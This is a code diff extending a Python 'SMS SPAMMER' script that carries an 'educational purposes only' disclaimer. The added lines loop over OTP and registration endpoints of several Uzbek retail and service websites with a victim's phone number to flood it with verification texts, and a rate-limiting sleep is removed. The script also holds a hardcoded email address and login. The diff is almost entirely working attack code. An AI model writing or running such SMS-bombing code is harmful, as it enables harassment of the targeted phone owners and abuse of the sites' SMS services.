@@ -12,7 +12,7 @@ Rules = '\033[94m' """
     |                  -----------                       |
     |                  SMS SPAMMER                       |
     |                  -----------                       |
-    |                    @takv54                         |
+    |            Contact - tg:  @takv54                  |
     |  ================================================= |                                                 
     |     This program was created for educational       |
     |   purposes only. All responsibility is on you      |
@@ -39,6 +39,27 @@ if CLOSE_AFTER > 100:
 	exit()
 while True :
  if time.time() > start_time + float(CLOSE_AFTER): exit()
+ try:
+    requests.get('https://mato.uz/index.php?', params={
+'dispatch': 'profiles.cp_phone_verification',
+'otp_type': 'register',
+'obj_id': '',
+'phone': mynumber,
+'result_ids': 'phone_verification_',
+'skip_result_ids_check': 'true',
+'is_ajax': '1'} )
+    print('\033[1;32m''sms sent!')
+ except:
+    print('Error mato')
+ if time.time() > start_time + float(CLOSE_AFTER): exit()
+  
+ try:
+    requests.post('https://api.zor.uz/user/registration', data={'phone': invest} )
+    print('\033[1;32m''sms sent!')
+ except:
+    print('Error elbozor')
+ if time.time() > start_time + float(CLOSE_AFTER): exit()
+ 
  try:
     requests.post('https://api.webpos.uz/api/client/sendsms', json={"phoneNumber": mynumber}  )
     print ('\033[1;32m''sms sent!')
@@ -181,8 +202,17 @@ while True :
  
  try:
     
+    requests.post('https://postavshik.korzinka.uz/api/auth/send-otp', json={"phone": '+'+ mynumber, "email": "ivanichl1970@rambler.ru", "login": "ivanovich22qq29"} )
+    print('\033[1;32m''sms sent!')
+ except:
+	 print('ERROR')
+    
+ if time.time() > start_time + float(CLOSE_AFTER): exit()
+ 
+ try:
+    
     requests.post('https://backend.texnomart.uz/api/v1/user/register', json={"phone": technomart, "first_name":"William", "last_name":"Johns"})
     print('\033[1;32m''sms sent!')
  except:
 	 print('ERROR')
- time.sleep(0.5) # created by https://github.com/database-max/spbmr
+ # # created by https://github.com/database-max/spbmr
